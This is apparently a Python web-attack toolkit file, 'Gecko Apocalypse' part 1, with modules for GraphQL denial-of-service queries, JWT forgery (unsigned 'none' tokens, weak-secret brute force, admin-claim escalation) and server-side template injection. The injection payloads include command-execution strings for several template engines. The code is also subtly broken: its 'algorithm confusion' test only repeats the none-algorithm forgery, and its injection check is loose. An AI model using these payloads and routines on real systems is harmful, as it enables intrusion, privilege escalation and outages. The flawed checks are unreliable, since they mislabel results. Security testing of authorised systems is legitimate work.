"""
GECKO APOCALYPSE - ATTACK MODULES COLLECTION (Part 1)
Modern Web Attack Vectors (2024-2026)
================================================================================
"""

import asyncio
import aiohttp
import re
import json
import base64
import jwt
import hashlib
import time
from typing import List, Dict, Optional, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from datetime import datetime, timedelta


# ============================================================================
# MODULE 1: GraphQL Fuzzer & Introspection
# ============================================================================
class GraphQLFuzzer:
    """
    Advanced GraphQL security testing:
    - Introspection queries
    - Query depth/complexity attacks
    - Batch query abuse
    - Field duplication DoS
    - Alias-based batching
    """
    
    def __init__(self, session: aiohttp.ClientSession, config: Dict, db):
        self.session = session
        self.config = config
        self.db = db
        
    async def scan(self, url: str, content: str, headers: Dict, response) -> List[Dict]:
        findings = []
        
        # Detect GraphQL endpoint
        if not self._is_graphql_endpoint(url, content, headers):
            return findings
            
        # Test 1: Introspection Query
        introspection_result = await self._test_introspection(url)
        if introspection_result:
            findings.append({
                'type': 'GraphQL Introspection Enabled',
                'severity': 'MEDIUM',
                'url': url,
                'evidence': introspection_result,
                'description': 'GraphQL introspection is enabled, exposing full schema',
                'remediation': 'Disable introspection in production environments',
                'cwe': 'CWE-200',
                'owasp': 'A01:2021 - Broken Access Control'
            })
            
        # Test 2: Query Depth Attack
        depth_result = await self._test_query_depth(url)
        if depth_result:
            findings.append({
                'type': 'GraphQL Query Depth DoS',
                'severity': 'HIGH',
                'url': url,
                'evidence': f"Server accepted query with depth {depth_result}",
                'description': 'No query depth limiting detected',
                'remediation': 'Implement query depth and complexity limits',
                'cwe': 'CWE-400',
                'owasp': 'A04:2021 - Insecure Design'
            })
            
        # Test 3: Batch Query Abuse
        batch_result = await self._test_batch_queries(url)
        if batch_result:
            findings.append({
                'type': 'GraphQL Batch Query Abuse',
                'severity': 'MEDIUM',
                'url': url,
                'evidence': f"Server processed {batch_result} batched queries",
                'remediation': 'Limit batch query size and implement rate limiting'
            })
            
        # Test 4: Alias-based Resource Exhaustion
        alias_result = await self._test_alias_attack(url)
        if alias_result:
            findings.append({
                'type': 'GraphQL Alias Resource Exhaustion',
                'severity': 'HIGH',
                'url': url,
                'evidence': alias_result
            })
            
        return findings
        
    def _is_graphql_endpoint(self, url: str, content: str, headers: Dict) -> bool:
        """Detect if endpoint is GraphQL."""
        indicators = [
            '/graphql' in url.lower(),
            'application/graphql' in headers.get('content-type', ''),
            '"errors":' in content and '"data":' in content,
            '__schema' in content or '__type' in content
        ]
        return any(indicators)
        
    async def _test_introspection(self, url: str) -> Optional[str]:
        """Test if introspection is enabled."""
        query = {
            "query": """
                query IntrospectionQuery {
                    __schema {
                        queryType { name }
                        mutationType { name }
                        types { name kind }
                    }
                }
            """
        }
        try:
            async with self.session.post(url, json=query, timeout=10) as resp:
                data = await resp.json()
                if '__schema' in str(data):
                    return json.dumps(data, indent=2)[:500]
        except:
            pass
        return None
        
    async def _test_query_depth(self, url: str) -> Optional[int]:
        """Test query depth limits."""
        for depth in [10, 20, 50, 100]:
            nested_query = self._generate_nested_query(depth)
            try:
                async with self.session.post(url, json={"query": nested_query}, timeout=15) as resp:
                    if resp.status == 200:
                        return depth
            except asyncio.TimeoutError:
                return depth
            except:
                pass
        return None
        
    def _generate_nested_query(self, depth: int) -> str:
        """Generate deeply nested query."""
        query = "{ user "
        for i in range(depth):
            query += "{ profile { user "
        query += "{ id } " + "} " * (depth + 1)
        return query
        
    async def _test_batch_queries(self, url: str) -> Optional[int]:
        """Test batch query limits."""
        batch_sizes = [10, 50, 100, 500]
        for size in batch_sizes:
            batch = [{"query": "{ __typename }"} for _ in range(size)]
            try:
                async with self.session.post(url, json=batch, timeout=20) as resp:
                    if resp.status == 200:
                        return size
            except:
                pass
        return None
        
    async def _test_alias_attack(self, url: str) -> Optional[str]:
        """Test alias-based resource exhaustion."""
        aliases = "\n".join([f"alias{i}: __typename" for i in range(1000)])
        query = f"{{ {aliases} }}"
        
        start = time.time()
        try:
            async with self.session.post(url, json={"query": query}, timeout=30) as resp:
                elapsed = time.time() - start
                if elapsed > 5:
                    return f"Query with 1000 aliases took {elapsed:.2f}s"
        except asyncio.TimeoutError:
            return "Server timeout with 1000 aliases"
        except:
            pass
        return None


# ============================================================================
# MODULE 2: JWT Manipulator
# ============================================================================
class JWTManipulator:
    """
    JWT security testing:
    - Algorithm confusion (RS256 -> HS256)
    - Weak signing keys
    - Missing signature verification
    - Token claim manipulation
    - Expired token acceptance
    """
    
    def __init__(self, session: aiohttp.ClientSession, config: Dict, db):
        self.session = session
        self.config = config
        self.db = db
        self.weak_secrets = ['secret', 'password', '123456', 'admin', 'jwt', 'key']
        
    async def scan(self, url: str, content: str, headers: Dict, response) -> List[Dict]:
        findings = []
        
        # Extract JWT tokens from response
        tokens = self._extract_jwt_tokens(content, headers)
        
        for token in tokens:
            # Test 1: Algorithm Confusion
            if await self._test_algorithm_confusion(url, token):
                findings.append({
                    'type': 'JWT Algorithm Confusion',
                    'severity': 'CRITICAL',
                    'url': url,
                    'evidence': f"Server accepted token with modified algorithm",
                    'payload': token,
                    'description': 'JWT accepts algorithm confusion attack (RS256->HS256)',
                    'remediation': 'Strictly validate JWT algorithm in backend',
                    'cwe': 'CWE-327',
                    'owasp': 'A02:2021 - Cryptographic Failures'
                })
                
            # Test 2: Weak Secret Brute Force
            cracked_secret = await self._test_weak_secret(token)
            if cracked_secret:
                findings.append({
                    'type': 'JWT Weak Secret',
                    'severity': 'CRITICAL',
                    'url': url,
                    'evidence': f"JWT secret cracked: '{cracked_secret}'",
                    'payload': token
                })
                
            # Test 3: None Algorithm
            if await self._test_none_algorithm(url, token):
                findings.append({
                    'type': 'JWT None Algorithm Accepted',
                    'severity': 'CRITICAL',
                    'url': url,
                    'evidence': "Server accepted unsigned JWT token"
                })
                
            # Test 4: Claim Manipulation
            claim_results = await self._test_claim_manipulation(url, token)
            findings.extend(claim_results)
            
        return findings
        
    def _extract_jwt_tokens(self, content: str, headers: Dict) -> List[str]:
        """Extract JWT tokens from response."""
        tokens = []
        
        # From Authorization header
        auth = headers.get('authorization', '') or headers.get('Authorization', '')
        if 'Bearer' in auth:
            tokens.append(auth.split('Bearer ')[-1].strip())
            
        # From cookies
        cookies = headers.get('set-cookie', '')
        jwt_pattern = r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
        tokens.extend(re.findall(jwt_pattern, cookies))
        
        # From response body
        tokens.extend(re.findall(jwt_pattern, content))
        
        return list(set(tokens))
        
    async def _test_algorithm_confusion(self, url: str, token: str) -> bool:
        """Test for algorithm confusion vulnerability."""
        try:
            # Decode without verification
            decoded = jwt.decode(token, options={"verify_signature": False})
            header = jwt.get_unverified_header(token)
            
            # Change algorithm to 'none'
            modified_token = jwt.encode(decoded, '', algorithm='none')
            
            # Test with modified token
            headers = {'Authorization': f'Bearer {modified_token}'}
            async with self.session.get(url, headers=headers, timeout=10) as resp:
                return resp.status == 200
        except:
            pass
        return False
        
    async def _test_weak_secret(self, token: str) -> Optional[str]:
        """Brute force weak JWT secrets."""
        try:
            decoded = jwt.decode(token, options={"verify_signature": False})
            
            for secret in self.weak_secrets:
                try:
                    jwt.decode(token, secret, algorithms=['HS256', 'HS384', 'HS512'])
                    return secret
                except jwt.InvalidSignatureError:
                    continue
                except:
                    continue
        except:
            pass
        return None
        
    async def _test_none_algorithm(self, url: str, token: str) -> bool:
        """Test if server accepts 'none' algorithm."""
        try:
            decoded = jwt.decode(token, options={"verify_signature": False})
            none_token = jwt.encode(decoded, '', algorithm='none')
            
            headers = {'Authorization': f'Bearer {none_token}'}
            async with self.session.get(url, headers=headers, timeout=10) as resp:
                return resp.status == 200
        except:
            pass
        return False
        
    async def _test_claim_manipulation(self, url: str, token: str) -> List[Dict]:
        """Test claim manipulation vulnerabilities."""
        findings = []
        try:
            decoded = jwt.decode(token, options={"verify_signature": False})
            
            # Test privilege escalation
            privilege_claims = ['role', 'admin', 'isAdmin', 'permissions', 'scope']
            for claim in privilege_claims:
                if claim in decoded:
                    modified = decoded.copy()
                    modified[claim] = 'admin' if isinstance(decoded[claim], str) else True
                    
                    # Re-encode without signature
                    modified_token = base64.urlsafe_b64encode(json.dumps({'alg': 'none'}).encode()).decode().rstrip('=')
                    modified_token += '.' + base64.urlsafe_b64encode(json.dumps(modified).encode()).decode().rstrip('=')
                    modified_token += '.'
                    
                    headers = {'Authorization': f'Bearer {modified_token}'}
                    async with self.session.get(url, headers=headers, timeout=10) as resp:
                        if resp.status == 200:
                            findings.append({
                                'type': 'JWT Privilege Escalation',
                                'severity': 'CRITICAL',
                                'url': url,
                                'evidence': f"Modified claim '{claim}' to gain elevated privileges"
                            })
        except:
            pass
        return findings


# ============================================================================
# MODULE 3: SSTI (Server-Side Template Injection) Detector
# ============================================================================
class SSTIDetector:
    """
    SSTI detection for multiple template engines:
    - Jinja2 (Python)
    - Twig (PHP)
    - Freemarker (Java)
    - Velocity (Java)
    - Smarty (PHP)
    - Handlebars (JavaScript)
    """
    
    def __init__(self, session: aiohttp.ClientSession, config: Dict, db):
        self.session = session
        self.config = config
        self.db = db
        
        # Template-specific payloads
        self.payloads = {
            'jinja2': [
                '{{7*7}}',
                '{{config.items()}}',
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}'
            ],
            'twig': [
                '{{7*7}}',
                '{{_self.env.getFilter("upper")}}',
                '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'
            ],
            'freemarker': [
                '${7*7}',
                '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            ],
            'velocity': [
                '${{7*7}}',
                '#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")'
            ],
            'smarty': [
                '{$smarty.version}',
                '{php}echo `id`;{/php}'
            ]
        }
        
    async def scan(self, url: str, content: str, headers: Dict, response) -> List[Dict]:
        findings = []
        
        # Get URL parameters
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return findings
            
        # Test each parameter
        for param in params.keys():
            for template_engine, payloads in self.payloads.items():
                for payload in payloads:
                    result = await self._test_payload(url, param, payload, template_engine)
                    if result:
                        findings.append(result)
                        break
                if findings:
                    break
                    
        return findings
        
    async def _test_payload(self, url: str, param: str, payload: str, engine: str) -> Optional[Dict]:
        """Test SSTI payload."""
        test_url = self._inject_parameter(url, param, payload)
        
        try:
            async with self.session.get(test_url, timeout=10) as resp:
                content = await resp.text()
                
                # Check for successful injection
                if self._verify_injection(payload, content):
                    return {
                        'type': 'Server-Side Template Injection',
                        'severity': 'CRITICAL',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'engine': engine,
                        'evidence': f"Template engine: {engine}, Payload reflected: {payload}",
                        'description': f'SSTI vulnerability in {engine} template engine',
                        'remediation': 'Never render user input in templates. Use sandboxed templates.',
                        'cwe': 'CWE-94',
                        'owasp': 'A03:2021 - Injection'
                    }
        except:
            pass
        return None
        
    def _inject_parameter(self, url: str, param: str, value: str) -> str:
        """Inject payload into URL parameter."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [value]
        new_query = urlencode(params, doseq=True)
        return parsed._replace(query=new_query).geturl()
        
    def _verify_injection(self, payload: str, response: str) -> bool:
        """Verify if template injection was successful."""
        # Check for mathematical operations
        if '7*7' in payload and '49' in response:
            return True
        if '{{7*7}}' in payload and '49' in response:
            return True
            
        # Check for specific engine artifacts
        checks = [
            ('config.items()' in payload and 'SECRET_KEY' in response),
            ('__subclasses__' in payload and '<class' in response),
            ('getFilter' in payload and 'Twig' in response),
            ('freemarker' in payload.lower() and 'uid=' in response),
            ('Runtime' in payload and 'uid=' in response)
        ]
        
        return any(checks)


# Export all modules
__all__ = ['GraphQLFuzzer', 'JWTManipulator', 'SSTIDetector']
